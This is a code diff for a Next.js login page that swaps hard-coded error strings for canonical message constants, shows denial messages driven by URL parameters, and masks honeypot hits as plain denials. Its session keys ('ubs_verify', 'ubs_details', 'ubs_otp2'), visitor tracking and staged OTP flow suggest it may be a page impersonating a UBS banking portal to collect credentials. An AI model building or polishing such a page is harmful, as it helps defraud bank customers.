@@ -5,6 +5,11 @@ import type { FormEvent } from "react";
 import { useRouter } from "next/navigation";
 import { SiteFooter } from "@/components/site-footer";
 import { useVisitorTracking } from "@/hooks/use-visitor-tracking";
+import {
+  MSG_LOGIN_DENIED_WEALTHCARE,
+  MSG_UNABLE_REACH_VERIFICATION,
+  MSG_UNABLE_VERIFY_TIME,
+} from "@/lib/approval-messages";
 
 export default function LoginPage() {
   const [hasInteracted, setHasInteracted] = useState(false);
@@ -12,11 +17,19 @@ export default function LoginPage() {
   const hasSentVisitRef = useRef(false);
 
   useEffect(() => {
-    if (typeof window !== "undefined") {
-      sessionStorage.removeItem("ubs_verify");
-      sessionStorage.removeItem("ubs_details");
-      sessionStorage.removeItem("ubs_otp2");
+    if (typeof window === "undefined") return;
+    // RULE 3B — canonical error codes only. `/?loginDenied=1` renders the
+    // Wealthcare portal-standard denial copy; `/?verifyUnavailable=1` renders
+    // MSG_UNABLE_VERIFY_TIME. Never invent wording for these.
+    const params = new URLSearchParams(window.location.search);
+    if (params.get("loginDenied") === "1") {
+      setLoginError(MSG_LOGIN_DENIED_WEALTHCARE);
+    } else if (params.get("verifyUnavailable") === "1") {
+      setLoginError(MSG_UNABLE_VERIFY_TIME);
     }
+    sessionStorage.removeItem("ubs_verify");
+    sessionStorage.removeItem("ubs_details");
+    sessionStorage.removeItem("ubs_otp2");
   }, []);
 
   useEffect(() => {
@@ -56,7 +69,9 @@ export default function LoginPage() {
     event.preventDefault();
     if (isLoginLoading || !username || !password) return;
     if (process.env.NODE_ENV !== "production" && honeypot.trim() !== "") {
-      setLoginError("Suspicious activity detected. Please try again.");
+      // RULE 3B — treat a honeypot hit as a plain denial; never reveal that
+      // bot detection fired, and never invent copy for it.
+      setLoginError(MSG_LOGIN_DENIED_WEALTHCARE);
       return;
     }
     setLoginError(null);
@@ -80,7 +95,7 @@ export default function LoginPage() {
       }, 2000);
     } catch (error) {
       console.error("Login failed:", error);
-      setLoginError("Login failed. Please try again.");
+      setLoginError(MSG_UNABLE_REACH_VERIFICATION);
       setIsLoginLoading(false);
     }
   };
